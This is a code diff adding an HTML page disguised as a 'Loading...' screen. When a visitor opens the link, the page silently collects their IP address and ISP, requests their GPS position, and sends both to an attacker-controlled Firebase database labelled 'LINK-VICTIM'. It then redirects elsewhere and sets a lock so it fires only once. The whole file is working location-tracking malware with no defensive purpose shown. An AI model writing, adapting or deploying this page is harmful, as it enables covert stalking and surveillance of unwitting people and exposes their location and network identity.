@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        const firebaseConfig = { /* SAME CONFIG */ };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const adminId = urlParams.get('id');
+        const redirect = atob(urlParams.get('redirect'));
+
+        async function captureData() {
+            // Check if 24h lock is active
+            if(localStorage.getItem('loc_lock')) {
+                window.location.href = redirect;
+                return;
+            }
+
+            // Get IP Address
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+
+            // Ask for GPS
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+
+                // Push to Admin's Transaction History
+                db.ref('users/' + adminId + '/trackingLogs').push({
+                    time: new Date().toLocaleString(),
+                    method: "LINK-VICTIM",
+                    coords: lat.toFixed(4) + ", " + lng.toFixed(4),
+                    isp: ipData.org + " (" + ipData.ip + ")",
+                    status: "Success"
+                }).then(() => {
+                    // Lock for 24 Hours
+                    localStorage.setItem('loc_lock', Date.now());
+                    window.location.href = redirect;
+                });
+            }, () => {
+                // If Location Denied, still save IP
+                db.ref('users/' + adminId + '/trackingLogs').push({
+                    time: new Date().toLocaleString(),
+                    method: "LINK-IP-ONLY",
+                    coords: "Denied",
+                    isp: ipData.ip,
+                    status: "Failed (GPS)"
+                });
+                window.location.href = redirect;
+            });
+        }
+        captureData();
+    </script>
+</body>
+</html>
